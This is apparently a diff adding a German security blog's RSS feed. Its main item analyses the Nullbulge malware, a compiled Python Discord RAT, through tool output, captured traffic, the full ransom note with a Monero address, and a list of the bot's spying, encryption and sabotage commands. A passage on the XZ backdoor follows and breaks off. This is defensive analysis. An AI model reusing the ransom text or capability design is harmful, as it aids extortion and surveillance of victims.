@@ -1,0 +1,840 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Blogs on </title>
+    <link>https://www.jmbit.de/blog/</link>
+    <description>Recent content in Blogs on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>de</language>
+    <lastBuildDate>Wed, 05 Jun 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://www.jmbit.de/blog/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Nullbulge-Ranner - Compiled Python Malware</title>
+      <link>https://www.jmbit.de/blog/2024-06-03-nullbulge-ranner/</link>
+      <pubDate>Mon, 03 Jun 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.jmbit.de/blog/2024-06-03-nullbulge-ranner/</guid>
+      <description>Ich bin in den letzten Tagen über Eric Parker auf Malware gestößen, über BeamNG-Mods verteilt wurde.
+Das interessante an dieser Malware ist, dass sie zwar in Python geschrieben ist, aber mithilfe von Pyinstaller1 kompiliert wurde. Dadurch, in Verbindung mit der gewählten Python-Version, ist die Malware effektiv nicht dekompilierbar und nur schwer zu reverse engineeren. Die meisten Informationen über die Malware mussten daher über dynamische Analyse in Sandboxen und VMs gewonnen werden.</description>
+      <content>&lt;p&gt;Ich bin in den letzten Tagen über &lt;a href=&#34;https://www.youtube.com/@EricParker&#34;&gt;Eric Parker&lt;/a&gt; auf Malware gestößen, über BeamNG-Mods verteilt wurde.&lt;/p&gt;
+&lt;p&gt;Das interessante an dieser Malware ist, dass sie zwar in Python geschrieben ist, aber mithilfe von Pyinstaller&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; kompiliert wurde.
+Dadurch, in Verbindung mit der gewählten Python-Version, ist die Malware effektiv nicht dekompilierbar und nur schwer zu reverse engineeren.
+Die meisten Informationen über die Malware mussten daher über dynamische Analyse in Sandboxen und VMs gewonnen werden.&lt;/p&gt;
+&lt;h2 id=&#34;oberflächliche-statische-analyse&#34;&gt;Oberflächliche statische Analyse&lt;/h2&gt;
+&lt;p&gt;Der Erste Schritt war, die Datei &amp;ldquo;statisch&amp;rdquo; zu analysieren, das heißt, sich die Eigenschaften der Malware anzuschauen ohne die Malware selbst auszuführen.
+Dafür habe ich initial die Tools &amp;ldquo;capa&amp;rdquo;&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;, &amp;ldquo;detect-it-easy&amp;rdquo;&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt; und &amp;ldquo;yara&amp;rdquo;&lt;sup id=&#34;fnref:4&#34;&gt;&lt;a href=&#34;#fn:4&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;4&lt;/a&gt;&lt;/sup&gt; verwendet.&lt;/p&gt;
+&lt;p&gt;Detect-It-Easy gibt uns genauere Informationen über die Datei, vor allem, dass sie mit PyInstaller &amp;ldquo;gepackt&amp;rdquo; wurde.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PE64
+    Linker: Microsoft Linker(14.36.33135)
+    Compiler: Microsoft Visual C/C++(19.36.33135)[C]
+    Tool: Visual Studio(2022 version 17.6)
+    Packer: PyInstaller
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Capa findet schon sehr viele Informationen:
+
+
+&lt;pre&gt;
+┍━━━━━━━━━━━━━━━━━━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
+│ ATT&amp;amp;CK Tactic          │ ATT&amp;amp;CK Technique                                                                   │
+┝━━━━━━━━━━━━━━━━━━━━━━━━┿━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┥
+│ &lt;font color=&#34;#06989A&#34;&gt;DEFENSE EVASION&lt;/font&gt;        │ &lt;font color=&#34;#06989A&#34;&gt;Obfuscated Files or Information&lt;/font&gt; T1027                                              │
+│                        │ &lt;font color=&#34;#06989A&#34;&gt;Virtualization/Sandbox Evasion&lt;/font&gt;::System Checks T1497.001                            │
+├────────────────────────┼────────────────────────────────────────────────────────────────────────────────────┤
+│ &lt;font color=&#34;#06989A&#34;&gt;DISCOVERY&lt;/font&gt;              │ &lt;font color=&#34;#06989A&#34;&gt;File and Directory Discovery&lt;/font&gt; T1083                                                 │
+│                        │ &lt;font color=&#34;#06989A&#34;&gt;System Information Discovery&lt;/font&gt; T1082                                                 │
+├────────────────────────┼────────────────────────────────────────────────────────────────────────────────────┤
+│ &lt;font color=&#34;#06989A&#34;&gt;EXECUTION&lt;/font&gt;              │ &lt;font color=&#34;#06989A&#34;&gt;Command and Scripting Interpreter&lt;/font&gt; T1059                                            │
+│                        │ &lt;font color=&#34;#06989A&#34;&gt;Shared Modules&lt;/font&gt; T1129                                                               │
+┕━━━━━━━━━━━━━━━━━━━━━━━━┷━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┙
+
+┍━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
+│ MBC Objective               │ MBC Behavior                                                                  │
+┝━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┿━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┥
+│ &lt;font color=&#34;#06989A&#34;&gt;ANTI-BEHAVIORAL ANALYSIS&lt;/font&gt;    │ &lt;font color=&#34;#06989A&#34;&gt;Virtual Machine Detection&lt;/font&gt; [B0009]                                             │
+├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
+│ &lt;font color=&#34;#06989A&#34;&gt;DATA&lt;/font&gt;                        │ &lt;font color=&#34;#06989A&#34;&gt;Checksum&lt;/font&gt;::Adler [C0032.005]                                                   │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;Compress Data&lt;/font&gt; [C0024]                                                         │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;Compression Library&lt;/font&gt; [C0060]                                                   │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;Encode Data&lt;/font&gt;::XOR [C0026.002]                                                  │
+├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
+│ &lt;font color=&#34;#06989A&#34;&gt;DEFENSE EVASION&lt;/font&gt;             │ &lt;font color=&#34;#06989A&#34;&gt;Obfuscated Files or Information&lt;/font&gt;::Encoding-Standard Algorithm [E1027.m02]      │
+├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
+│ &lt;font color=&#34;#06989A&#34;&gt;DISCOVERY&lt;/font&gt;                   │ &lt;font color=&#34;#06989A&#34;&gt;Analysis Tool Discovery&lt;/font&gt;::Process detection [B0013.001]                        │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;File and Directory Discovery&lt;/font&gt; [E1083]                                          │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;System Information Discovery&lt;/font&gt; [E1082]                                          │
+├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
+│ &lt;font color=&#34;#06989A&#34;&gt;EXECUTION&lt;/font&gt;                   │ &lt;font color=&#34;#06989A&#34;&gt;Command and Scripting Interpreter&lt;/font&gt; [E1059]                                     │
+├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
+│ &lt;font color=&#34;#06989A&#34;&gt;FILE SYSTEM&lt;/font&gt;                 │ &lt;font color=&#34;#06989A&#34;&gt;Create Directory&lt;/font&gt; [C0046]                                                      │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;Delete Directory&lt;/font&gt; [C0048]                                                      │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;Delete File&lt;/font&gt; [C0047]                                                           │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;Read File&lt;/font&gt; [C0051]                                                             │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;Writes File&lt;/font&gt; [C0052]                                                           │
+├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
+│ &lt;font color=&#34;#06989A&#34;&gt;OPERATING SYSTEM&lt;/font&gt;            │ &lt;font color=&#34;#06989A&#34;&gt;Environment Variable&lt;/font&gt;::Set Variable [C0034.001]                                │
+├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
+│ &lt;font color=&#34;#06989A&#34;&gt;PROCESS&lt;/font&gt;                     │ &lt;font color=&#34;#06989A&#34;&gt;Create Process&lt;/font&gt; [C0017]                                                        │
+│                             │ &lt;font color=&#34;#06989A&#34;&gt;Terminate Process&lt;/font&gt; [C0018]                                                     │
+┕━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┷━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┙
+
+┍━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
+│ Capability                                           │ Namespace                                            │
+┝━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┿━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┥
+│ &lt;font color=&#34;#06989A&#34;&gt;reference analysis tools strings&lt;/font&gt;                     │ anti-analysis                                        │
+│ &lt;font color=&#34;#06989A&#34;&gt;reference anti-VM strings targeting Qemu&lt;/font&gt;             │ anti-analysis/anti-vm/vm-detection                   │
+│ &lt;font color=&#34;#06989A&#34;&gt;reference anti-VM strings targeting Xen&lt;/font&gt;              │ anti-analysis/anti-vm/vm-detection                   │
+│ &lt;font color=&#34;#06989A&#34;&gt;compute adler32 checksum&lt;/font&gt;                             │ data-manipulation/checksum/adler32                   │
+│ &lt;font color=&#34;#06989A&#34;&gt;compress data via ZLIB inflate or deflate&lt;/font&gt;            │ data-manipulation/compression                        │
+│ &lt;font color=&#34;#06989A&#34;&gt;encode data using XOR&lt;/font&gt; (6 matches)                    │ data-manipulation/encoding/xor                       │
+│ &lt;font color=&#34;#06989A&#34;&gt;accept command line arguments&lt;/font&gt;                        │ host-interaction/cli                                 │
+│ &lt;font color=&#34;#06989A&#34;&gt;query environment variable&lt;/font&gt; (4 matches)               │ host-interaction/environment-variable                │
+│ &lt;font color=&#34;#06989A&#34;&gt;set environment variable&lt;/font&gt; (4 matches)                 │ host-interaction/environment-variable                │
+│ &lt;font color=&#34;#06989A&#34;&gt;get common file path&lt;/font&gt;                                 │ host-interaction/file-system                         │
+│ &lt;font color=&#34;#06989A&#34;&gt;create directory&lt;/font&gt; (2 matches)                         │ host-interaction/file-system/create                  │
+│ &lt;font color=&#34;#06989A&#34;&gt;delete directory&lt;/font&gt;                                     │ host-interaction/file-system/delete                  │
+│ &lt;font color=&#34;#06989A&#34;&gt;delete file&lt;/font&gt;                                          │ host-interaction/file-system/delete                  │
+│ &lt;font color=&#34;#06989A&#34;&gt;enumerate files on Windows&lt;/font&gt;                           │ host-interaction/file-system/files/list              │
+│ &lt;font color=&#34;#06989A&#34;&gt;get file size&lt;/font&gt;                                        │ host-interaction/file-system/meta                    │
+│ &lt;font color=&#34;#06989A&#34;&gt;read file on Windows&lt;/font&gt; (10 matches)                    │ host-interaction/file-system/read                    │
+│ &lt;font color=&#34;#06989A&#34;&gt;write file on Windows&lt;/font&gt; (2 matches)                    │ host-interaction/file-system/write                   │
+│ &lt;font color=&#34;#06989A&#34;&gt;get disk information&lt;/font&gt; (2 matches)                     │ host-interaction/hardware/storage                    │
+│ &lt;font color=&#34;#06989A&#34;&gt;create process on Windows&lt;/font&gt;                            │ host-interaction/process/create                      │
+│ &lt;font color=&#34;#06989A&#34;&gt;terminate process&lt;/font&gt;                                    │ host-interaction/process/terminate                   │
+│ &lt;font color=&#34;#06989A&#34;&gt;link many functions at runtime&lt;/font&gt; (2 matches)           │ linking/runtime-linking                              │
+│ &lt;font color=&#34;#06989A&#34;&gt;linked against ZLIB&lt;/font&gt;                                  │ linking/static/zlib                                  │
+│ &lt;font color=&#34;#06989A&#34;&gt;parse PE header&lt;/font&gt; (3 matches)                          │ load-code/pe                                         │
+│ &lt;font color=&#34;#06989A&#34;&gt;resolve function by parsing PE exports&lt;/font&gt;               │ load-code/pe                                         │
+┕━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┷━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┙
+&lt;/pre&gt;
+
+
+
+Auch Yara findet einige Pattern in der Datei:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;DebuggerException__SetConsoleCtrl
+anti_dbg
+screenshot
+win_token
+win_files_operation
+Big_Numbers1 
+CRC32_poly_Constant 
+CRC32_table 
+MachO_File_pyinstaller 
+IsPE64 
+IsWindowsGUI 
+IsPacked 
+HasOverlay 
+HasDigitalSignature 
+HasDebugData 
+HasRichSignature 
+Microsoft_Visual_Cpp_80 
+Microsoft_Visual_Cpp_80_DLL 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Zusammenfassend können wir aus dieser statischen Analyse also sagen, dass die Malware es versucht, einem die Analyse schwerer zu machen und möglicherweise ein
+RAT ist (kann laut YARA screenshots machen).&lt;/p&gt;
+&lt;h2 id=&#34;dynamische-analyse-mit-cape&#34;&gt;Dynamische Analyse mit CAPE&lt;/h2&gt;
+&lt;p&gt;Eine &lt;a href=&#34;https://www.jmbit.de/blog/2023-11-30-capev2-sandbox/&#34;&gt;CAPE-Sandbox-Umgebung&lt;/a&gt; ist eine gute Möglichkeit, lokal dynamische Analysen von Malware oder potenzieller
+Malware durchzuführen. In diesem Fall enthält die zu analysierende Datei zwar keine sensiblen Daten, sollte das aber der Fall sein, ist es ggf. nicht sinnvoll,
+die Datei auf eine Cloud-Platform hochzuladen.&lt;/p&gt;
+&lt;p&gt;Hier fielen vor allem die Anti-Analyse-Funktionen sowie die Requests zu Discord auf. Da die Malware jedoch ohne Verbindung zu Discord relativ inaktiv ist und keine user-interaktion bietet, ist die
+dynamische analyse hier abgesehen von den Informationen über die installation der Software und ihr Verhalten gegenüber Virtualisierung und Debuggern nicht besonders ergibig.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://cloud.jmbit.de/s/qLtzrFyjY3TfQmX&#34;&gt;REPORT&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;analyse-des-webtraffic-mithilfe-von-mitmproxy&#34;&gt;Analyse des Webtraffic mithilfe von MITMProxy&lt;/h2&gt;
+&lt;p&gt;Um den Webtraffic genauer anzusehen und mitlesen zu können und eventuelle API-Keys abfangen zu können, habe ich die Malware in einer VM gestartet, die über mitmproxy&lt;sup id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;5&lt;/a&gt;&lt;/sup&gt; ins Internet gegangen ist.
+Hier wurde aber lediglich versucht, sich als ein Bot in Discord einzuloggen, der Zugriff wurde jedoch abgelehnt:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /api/v10/users/@me &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;discord.com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;DiscordBot (https://github.com/Rapptz/discord.py 2.3.2) Python/3.10 aiohttp/3.9.5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Authorization&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Bot &amp;lt;REDACTED&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTP/1.1 401 Unauthorized
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&amp;#34;message&amp;#34;: &amp;#34;401: Unauthorized&amp;#34;, &amp;#34;code&amp;#34;: 0}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;analyse-des-programmcodes&#34;&gt;Analyse des Programmcodes&lt;/h2&gt;
+&lt;p&gt;Nachdem ich der Malware in der Dynamischen Analyse kaum Informationen entlocken konnte, ging es an die statische Analyse. Da Python 3.10 leider zu neu für die meisten Decompiler ist&lt;sup id=&#34;fnref:6&#34;&gt;&lt;a href=&#34;#fn:6&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;6&lt;/a&gt;&lt;/sup&gt;, musste ich mich mit dem
+Ergebnis eines Disassemblers zufrieden geben. Aus dem Output dieses (Immerhin 21355 Zeilen!) lies sich der Verdacht, dass es sich bei der Malware um eine Version von PySilon handelt, bestätigen.
+Es wurden jedoch einige zusätzliche Funktionen eingefügt, so zum Beispiel Ransomware und die Möglichkeit des Nachladens eines Cryptominers. Ebenfalls bin ich über während der Analyse auf andere Malware der
+gleichen Gruppe gestoßen.&lt;/p&gt;
+&lt;p&gt;Die Ransomware-Mitteilung &lt;code&gt;NULLBULGE-RANSOMWARE-NOTE.TXT&lt;/code&gt; würde diesen Text enthalten:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;READ THIS ENTIRELY BEFORE ACTING, IF YOU SHUT DOWN NOW, ALL WILL BE LOST.
+Your computer is now infected with ransomware. Your file are encrypted with a secure algorithm that is impossible to crack.
+By now it has moved from your main drive, and has started encrypting other drives.
+DONT PANIC! IF YOU START LOOKING FOR THE VIRUS, YOU WILL NOT GET ANY FILES ALREADY ENCRYPTED BACK! BUT THEY CAN BE SAVED!
+To recover your files you need a key. This key is generated once your file have been encrypted. To obtain the key, you must purchase it.
+You can do this by sending 100 USD to this monero address:
+45i7kjWZuzJ4PdSbandaaE8S6mQATmneTYEpgsaaCqDmc7foEJDXwxd3ABR8bn6YE4c7hZ2dYEEr1CwG48gAknPL6zUpYyV
+Don&amp;#39;t know how to get monero? Here are some websites:
+https://www.kraken.com/learn/buy-monero-xmr
+https://localmonero.co/?language=en
+https://www.bestchange.com/visa-mastercard-usd-to-monero.html
+Cant get monero and want to pay via giftcards instead? contact the email below.
+Once you have sent the ransom to the monero address you must write an email this this email address: ZeCBMail@proton.me
+In this email you will include your personal ID so we know who you are. Your personal ID is: 
+&amp;lt;ID&amp;gt;
+Payment is flexable, if you want to discuss pricing send an email with your discord username and I will contact you.
+Be warned... pricing can go up too!
+Once you have completeted all of the steps, you will be provided with the key to decrypt your files.
+Don&amp;#39;t know how ransomware works? Read up here:
+https://www.trellix.com/en-us/security-awareness/ransomware/what-is-ransomware.html
+https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/
+https://www.trendmicro.com/vinfo/us/security/definition/Ransomware
+Note: Messing with the ransomware will simply make your files harder to decrypt. Deleting the virus will make it impossible, as the key can not be generated.
+Good luck
+-NullBulge
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Der Crypto-Miner ist XMRIG und mined für den Pool &amp;ldquo;xmrpool.eu&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;Der Bot wird sowohl über Discord-Reactions als auch über direkte Befehle gesteuert. Die Reactions können einfachere Funktionen abbilden, wie z.B. das wipen der Malware vom System.
+Interessanter sind jedoch die &amp;ldquo;richtigen&amp;rdquo; Befehle, z.B.:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;lsquo;.ss&amp;rsquo; -&amp;gt; Macht einen Screenshot vom Bildschirm des Opfers&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.screenrec&amp;rsquo; -&amp;gt; zeichnet 15 Sekunden den Bildschirm auf&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.join&amp;rsquo; -&amp;gt; Tritt einem Voice Channel bei und überträgt die Aufnahmen des Mikrofons&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.show&amp;rsquo; -&amp;gt; Zeigt informationen, z.B. alle laufenden Prozesse&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.kill&amp;rsquo; -&amp;gt; Beendet einen Prozesse&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.block-input&amp;rsquo; -&amp;gt; Deaktiviert Tastatur- und Mauseingaben&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.break-windows&amp;rsquo; -&amp;gt; Bennent den Boot-Manager um und verhindert damit, dass Windows rebooten kann&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.xmrig&amp;rsquo; -&amp;gt; Führt den Cryptominer aus&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.webcam photo&amp;rsquo; -&amp;gt; Macht ein Bild mit der Webcam&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.encrypt&amp;rsquo; -&amp;gt; Verschlüsselt alle Dateien im angegebenen Verzeichnis&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.cmd&amp;rsquo; -&amp;gt; Führt beliebigen Befehl aus&lt;/li&gt;
+&lt;li&gt;&amp;lsquo;.admin&amp;rsquo; -&amp;gt; Kann Funktionen ausführen wie Defender, Taskmanager oder UAC deaktiveren.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;Pyinstaller ist Software, die es ermöglicht, in Python geschriebene Programme so zu compilen und bundlen, dass sie auf Systemen ohne Python-Interpreter
+benutzt werden können. Das kann z.B. als PE-File (Windows .exe) oder ELF (Linux/Unix) sein.&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/mandiant/capa&#34;&gt;mandiant/capa&lt;/a&gt;, ein Tool, das eine Datei analysiert und versucht, deren Fähigkeiten (capabilities) zu erfassen.&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:3&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/horsicq/Detect-It-Easy&#34;&gt;horsicq/Detect-It-Easy&lt;/a&gt; gibt einem die Eigenschaften einer Datei zurück.&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:4&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://virustotal.github.io/yara/&#34;&gt;Yara&lt;/a&gt; ist eine Bibliothek zur Analyse von Malware anhand von Pattern/Eigenschaften der Dateien.&amp;#160;&lt;a href=&#34;#fnref:4&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:5&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://mitmproxy.org/&#34;&gt;MITMProxy&lt;/a&gt; ist ein Forward-Proxy, der alle Verbindungen die über ihn laufen aufzeichnet&amp;#160;&lt;a href=&#34;#fnref:5&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:6&#34;&gt;
+&lt;p&gt;Weder &lt;a href=&#34;https://github.com/zrax/pycdc&#34;&gt;pycdc&lt;/a&gt; noch &lt;a href=&#34;https://github.com/greyblue9/unpyc37-3.10&#34;&gt;unpyc37-3.10&lt;/a&gt; konnten den Bytecode decompilen.&amp;#160;&lt;a href=&#34;#fnref:6&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Gedanken zu XZ</title>
+      <link>https://www.jmbit.de/blog/2024-04-04-xz-thoughts/</link>
+      <pubDate>Thu, 04 Apr 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.jmbit.de/blog/2024-04-04-xz-thoughts/</guid>
+      <description>Dieser Blogpost ist dazu da, meine Gedanken zu der XZ-Situation zusammenzufassen.
+1. Die Entdeckung Die Entdeckung der Backdoor in liblzma war einerseits ein purer Glücksgriff, andererseits auch ein Beispiel dafür, warum Open Source so wichtig für die Entdeckung und Analyse von Schwachstellen ist. In diesem Fall war es dem Entdecker - trotz der Tatsache, dass er eigentlich Datenbank-Entwickler ist - in verhältnismäßig kurzer Zeit möglich, die Ursache der &amp;ldquo;langsamen&amp;rdquo; SSH-Logins (800 statt 300 ms) zu ermitteln und zu analysieren.</description>
+      <content>&lt;p&gt;Dieser Blogpost ist dazu da, meine Gedanken zu der XZ-Situation zusammenzufassen.&lt;/p&gt;
+&lt;h2 id=&#34;1-die-entdeckung&#34;&gt;1. Die Entdeckung&lt;/h2&gt;
+&lt;p&gt;Die &lt;a href=&#34;https://www.openwall.com/lists/oss-security/2024/03/29/4&#34;&gt;Entdeckung der Backdoor in liblzma&lt;/a&gt;
+war einerseits ein purer Glücksgriff, andererseits auch ein Beispiel dafür, warum
+Open Source so wichtig für die Entdeckung und Analyse von Schwachstellen ist. In diesem Fall war es dem Entdecker -
+trotz der Tatsache, dass er eigentlich Datenbank-Entwickler ist - in verhältnismäßig kurzer Zeit möglich, die Ursache
+der &amp;ldquo;langsamen&amp;rdquo; SSH-Logins (800 statt 300 ms) zu ermitteln und zu analysieren. Im Vergleich dazu hatte ich deutlich mehr
+Zeit investiert in die letztlich erfolglose Analyse eines Memory leaks unter Microsoft Windows.&lt;/p&gt;
+&lt;h2 id=&#34;2-die-potenziellen-auswirkungen&#34;&gt;2. Die potenziellen Auswirkungen&lt;/h2&gt;
+&lt;p&gt;Wäre die Backdoor erfolgreich verbreitet worden, wäre früher oder später -
+&lt;a href=&#34;https://infosec.exchange/@SecureOwl/112181879860988729&#34;&gt;abhängig vom Patchzyklus&lt;/a&gt; - ein großer Teil der Server im
+Internet verwundbar gewesen:
+&lt;img alt=&#34;Shodan zeigt 19 698 358 OpenSSH Server&#34; src=&#34;https://www.jmbit.de/img/blog/shodan-openssh-2024-04-04.png&#34;&gt;
+Der Angreifer hätte ähnlichen Zugriff auf diese Server gehabt wie damals mit Ethernal Blue auf Windows-Server&amp;hellip; Nur
+dass laut Shodan nur etwa 420 000 Windows Server mit offenem SMB-Port im Internet stehen.&lt;/p&gt;
+&lt;h2 id=&#34;3-analyse&#34;&gt;3. Analyse&lt;/h2&gt;
+&lt;p&gt;Die Analyse der Backdoor (abgesehen von dem nicht gerade hilfreichen Takedown durch Github) hat einige interessante
+Informationen zu Tage befördert. Einmal die Tatsache, dass diese Backdoor sehr gut versteckt war, enthalten in einer
